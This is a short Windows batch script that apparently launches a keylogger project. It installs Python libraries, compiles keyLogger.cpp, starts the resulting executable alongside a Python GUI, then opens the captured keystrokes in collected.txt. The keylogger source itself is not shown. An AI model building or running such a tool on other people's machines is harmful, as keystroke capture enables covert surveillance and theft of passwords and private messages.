@ECHO OFF
cd src
python pipLibs.py
g++ keyLogger.cpp -o keyLogger
start .\keyLogger.exe
python .\GUI.py
timeout /t 10 /nobreak > nul
notepad collected.txt